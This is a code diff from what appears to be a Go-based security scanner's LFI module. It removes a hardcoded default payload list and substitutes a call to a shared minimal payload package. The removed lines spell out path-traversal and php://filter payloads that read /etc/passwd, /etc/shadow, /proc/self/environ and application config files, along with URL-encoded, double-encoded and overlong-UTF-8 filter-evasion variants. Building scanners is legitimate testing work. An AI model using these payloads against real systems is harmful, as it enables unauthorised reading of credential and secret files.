@@ -77,29 +77,14 @@ func (m *LFIScanner) getPayloads() []lfiPayloadEntry {
 			return result
 		}
 	}
-	return defaultPayloads()
-}
-
-func defaultPayloads() []lfiPayloadEntry {
-	return []lfiPayloadEntry{
-		{"../../../../etc/passwd", "linux", "basic", "root:x:0:0"},
-		{"....//....//....//....//etc/passwd", "linux", "double-slash", "root:x:0:0"},
-		{"..%2F..%2F..%2F..%2Fetc%2Fpasswd", "linux", "url-encoded", "root:x:0:0"},
-		{"..%252f..%252f..%252f..%252fetc%252fpasswd", "linux", "double-url-encoded", "root:x:0:0"},
-		{"/etc/passwd", "linux", "absolute", "root:x:0:0"},
-		{"....\\....\\....\\....\\windows\\win.ini", "windows", "backslash", "[fonts]"},
-		{"..\\..\\..\\..\\windows\\win.ini", "windows", "basic-backslash", "[fonts]"},
-		{"../../../../windows/win.ini", "windows", "forward-slash", "[fonts]"},
-		{"/proc/self/environ", "linux", "proc-environ", "PATH="},
-		{"/proc/self/cmdline", "linux", "proc-cmdline", "/"},
-		{"php://filter/convert.base64-encode/resource=index.php", "php", "php-filter", "PD9waHA"},
-		{"php://filter/read=convert.base64-encode/resource=../config.php", "php", "php-filter-config", "PD9waHA"},
-		{"file:///etc/passwd", "linux", "file-protocol", "root:x:0:0"},
-		{"..%c0%af..%c0%af..%c0%afetc/passwd", "linux", "utf8-overlong", "root:x:0:0"},
-		{"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "linux", "unicode-slash", "root:x:0:0"},
-		{"/etc/shadow", "linux", "shadow", "root:"},
-		{"../../../../etc/hosts", "linux", "hosts", "localhost"},
+	payload.LogFallbackOnce("lfi")
+	var result []lfiPayloadEntry
+	for _, p := range payload.MinimalLFIPayloads() {
+		result = append(result, lfiPayloadEntry{
+			value: p.Value, os: p.OS, variant: p.Variant, evidence: p.Evidence,
+		})
 	}
+	return result
 }
 
 func (m *LFIScanner) Run(ctx context.Context, targets []*core.Target, config map[string]interface{}) (*core.ModuleResult, error) {
